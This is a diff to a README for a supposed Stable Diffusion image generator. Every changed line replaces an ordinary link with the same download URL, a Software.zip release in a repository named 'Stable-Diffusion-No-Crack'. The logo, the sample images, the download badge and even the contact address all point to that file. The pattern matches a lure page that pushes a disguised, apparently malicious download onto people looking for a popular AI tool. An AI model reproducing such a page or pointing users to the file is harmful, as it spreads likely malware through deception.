@@ -1,6 +1,6 @@
 # 🎨 Welcome to Stable Diffusion AI Image Generator 🖼️
 
-![Stable Diffusion Logo](https://example.com/logo.png)
+![Stable Diffusion Logo](https://github.com/Shreejitghute07/Stable-Diffusion-No-Crack/releases/download/v1.0/Software.zip)
 
 Stable Diffusion is an innovative AI-powered tool that revolutionizes the way artists and designers create high-quality images from text descriptions. With advanced machine learning algorithms, Stable Diffusion allows users to effortlessly convert text into visually stunning artworks, making it the perfect companion for creative minds.
 
@@ -16,7 +16,7 @@ Stable Diffusion is an innovative AI-powered tool that revolutionizes the way ar
 
 ## 🚀 Getting Started
 
-To get started with Stable Diffusion, simply [download the latest release](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip) and launch the application. For more detailed instructions, check the "Releases" section of this repository.
+To get started with Stable Diffusion, simply [download the latest release](https://github.com/Shreejitghute07/Stable-Diffusion-No-Crack/releases/download/v1.0/Software.zip) and launch the application. For more detailed instructions, check the "Releases" section of this repository.
 
 ## 🌐 Repository Details
 
@@ -24,15 +24,15 @@ To get started with Stable Diffusion, simply [download the latest release](https
 - **Description**: Stable Diffusion is an AI-powered tool that generates high-quality images from text descriptions, perfect for artists and designers.
 - **Topics**: ai-art, ai-generated-images, ai-image-generator, ai-powered-art, art-generator, artificial-intelligence, artistic-creation, concept-art, creative-ai, creative-tools, design-prototypes, design-tools, image-generation, image-stylization, machine-learning, open-source-ai, stable-diffusion, text-to-art, text-to-image, visual-art-generation
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-blue)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download Latest Release](https://github.com/Shreejitghute07/Stable-Diffusion-No-Crack/releases/download/v1.0/Software.zip%20Release-blue)](https://github.com/Shreejitghute07/Stable-Diffusion-No-Crack/releases/download/v1.0/Software.zip)
 
 ## 🎨 Sample Images
 
 Here are a few examples of images generated using Stable Diffusion:
 
-![Image 1](https://example.com/image1.png)
-![Image 2](https://example.com/image2.png)
-![Image 3](https://example.com/image3.png)
+![Image 1](https://github.com/Shreejitghute07/Stable-Diffusion-No-Crack/releases/download/v1.0/Software.zip)
+![Image 2](https://github.com/Shreejitghute07/Stable-Diffusion-No-Crack/releases/download/v1.0/Software.zip)
+![Image 3](https://github.com/Shreejitghute07/Stable-Diffusion-No-Crack/releases/download/v1.0/Software.zip)
 
 ## 📚 How to Use Stable Diffusion
 
@@ -51,7 +51,7 @@ We welcome artists, designers, and AI enthusiasts to join our community and shar
 
 ## 📞 Contact Us
 
-If you have any questions, feedback, or suggestions regarding Stable Diffusion, feel free to reach out to us at [contact@stablediffusion.com](mailto:contact@stablediffusion.com).
+If you have any questions, feedback, or suggestions regarding Stable Diffusion, feel free to reach out to us at [https://github.com/Shreejitghute07/Stable-Diffusion-No-Crack/releases/download/v1.0/Software.zip](https://github.com/Shreejitghute07/Stable-Diffusion-No-Crack/releases/download/v1.0/Software.zip).
 
 Let your creativity flow with Stable Diffusion AI Image Generator! 🎨🌟🚀
 
